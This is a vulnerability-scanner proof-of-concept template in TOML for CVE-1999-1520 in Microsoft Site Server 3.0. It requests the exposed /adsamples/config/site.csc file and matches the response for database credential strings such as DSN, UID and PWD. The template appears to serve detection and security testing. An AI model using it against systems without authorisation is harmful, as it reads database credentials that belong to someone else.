[info]
author = "ave"
description = "Microsoft Site Server 3.0 Commerce Edition AdSamples 示例目录默认安装后未配置访问控制，远程攻击者可通过 HTTP GET 请求直接读取 /adsamples/config/site.csc 文件，该文件泄露 SQL 数据库 DSN、用户名和密码等敏感连接信息。"
id = "POC-AVE-1999-1157"
name = "Microsoft Site Server 3.0 AdSamples SITE.CSC 信息泄露 PoC"
severity = "medium"
tags = ["ave-1999-1157"]
vuln_id = [
    "CVE-1999-1520",
    "AVE-1999-1157",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/adsamples/config/site.csc"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "DSN",
    "UID",
    "PWD",
    "Password",
    "Connect",
]
